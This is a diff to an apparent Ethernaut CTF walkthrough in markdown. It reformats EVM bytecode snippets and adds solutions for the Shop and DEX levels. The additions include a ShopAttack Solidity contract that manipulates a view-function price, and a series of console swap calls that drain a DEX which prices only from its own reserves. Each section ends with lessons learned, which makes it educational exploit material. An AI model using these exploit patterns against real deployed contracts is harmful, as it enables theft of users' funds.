@@ -628,20 +628,16 @@ First copy your  `runtime opcodes`  into memory. Add a placeholder for  `f`(curr
 
 4. Then,  `return`  your in-memory  `runtime opcodes`  to the EVM:
 
-```
-    600a    // s: push1 0x0a (runtime opcode length) 
-    6000    // p: push1 0x00 (access memory index 0)  
-    f3      // return to EVM
-```
+    `600a    // s: push1 0x0a (runtime opcode length)  `
+    `6000    // p: push1 0x00 (access memory index 0)`  
+    `f3      // return to EVM`
 
 5. Notice that in total, your  `initialization opcodes`  take up 12 bytes, or  `0x0c`  spaces. This means your  `runtime opcodes`  will start at index  `0x0c`, where  `f`  is now known to be  `0x0c`            
 
-```
-    600a    // s: push1 0x0a (10 bytes)  
-    60**0c**    // f: push1 0x?? 
-    6000    // t: push1 0x00 (destination memory index 0)  
-    39      // CODECOPY
-```
+    `600a    // s: push1 0x0a (10 bytes)`  
+    `60**0c**    // f: push1 0x?? `
+    `6000    // t: push1 0x00 (destination memory index 0)  `
+    `39      // CODECOPY`
 
 6. The final sequence is thus:
 
@@ -734,3 +730,81 @@ Since this once has been explained already, do try here with the code and see if
 	    }
     
     }
+
+## P21 - Shop
+
+The contract exploits essentially the same principle as an example we have already discussed. Every contract you use with an interface adds a layer of abstraction, and hence a layer on vulnerability. Check out this sample code - 
+
+    // SPDX-License-Identifier: MIT
+    pragma  solidity  ^0.8.0;
+    
+    interface Buyer {
+    function price()  external  view  returns  (uint);
+    }  
+    
+    contract ShopAttack is Buyer{
+    
+	    address  public victimContract;
+	    
+	    constructor(address _victimContractAddress)  {
+		    victimContract = _victimContractAddress;
+	    }
+	    
+	    function price()  public  view  override  returns(uint)  {
+		    bytes  memory payload =  abi.encodeWithSignature("isSold()");
+		    (,  bytes  memory result)  = 
+		    victimContract.staticcall(payload);
+		    bool sold =  abi.decode(result,  (bool));
+		    return sold ?  1  :  101;
+	    }
+	    
+	    function attackContract()  external  returns(bool success)  {
+		    (success,)  = victimContract.call(abi.encodeWithSignature("buy()"));
+	    }
+	    
+    }
+
+## P22 - DEX
+
+And now on to DeFi. DEXs are a prime application type built to support transaction in the decentralized finance space. However, one of the biggest problems with a DEX is that of  **impermanent loss**. Think of it as - 
+
+If you sell bananas and oranges, and your buyers prefer bananas to oranges - they will keep swapping oranges and pulling out bananas from your shop. If this keeps happening, your reserves of oranges will pile up (making them cheaper) whilst your bananas will get more expensive. 
+
+And just like that, due to market pressure - you will have a price of bananas and oranges that is different from that of the rest of the market. For someone who gave you an orange to sell for them (i.e provided liquidity) - they will now get a raw deal (no pun intened).
+
+    Impermanent loss happens when the price of your tokens changes 
+    compared to when you deposited them in the pool. The larger the 
+    change is, the bigger the loss.
+
+One can conveniently see - that if you a malicious actor wants to mess the price of an asset - they can keep making such swaps on a pool and change the price by changing how much of each asset that pool is left with. To counter this problem, advanced DEXs generally rely on multiple sources of price information (via Oracles) to calculate exact prices and predict impermanent loss.
+
+**Vulnerability -** This contract only relies on it's own liquidity for finding price 
+
+**Exploit-**
+Step 1 - Let's see what happens if we start making some extreme trades on this pool. I say extreme because we already own 10% of it on either side. 
+
+|Trade #  | Spot Price 
+|--|--|
+|0 [tkn1 -> tkn2]|Amount(token_2) = 10 * 100 / 100|= 10 |
+|1 [tkn2 -> tkn1]|Amount(token_1) = 20 * 110 / 90|= 24|
+|2 [tkn1 -> tkn2]|Amount(token_2) = 24 * 110 / 86|= 30 |
+
+And so on till we can diminish the reserves of the pool greatly 
+
+Step 2 - Now we will approve the pool for these transactions and simply carry them out in a pre-calculated fashion till we are able to deplete the funds in this pool.
+
+```
+let a = await contract.token1();
+let b = await contract.token2();
+await contract.approve(instance, "1000000000000");
+await contract.swap(a, b, 10);
+await contract.swap(b, a, 20);
+await contract.swap(a, b, 24);
+await contract.swap(b, a, 30);
+await contract.swap(a, b, 41);
+await contract.swap(b, a, 45); 
+```
+**Learning** - 
+
+- Contracts that are required to have a reliable and accurate source of external data, should never rely only on one oracle source to obtain such data. 
+- Fragmented liquidity leads to high slippage and impermanent loss. 
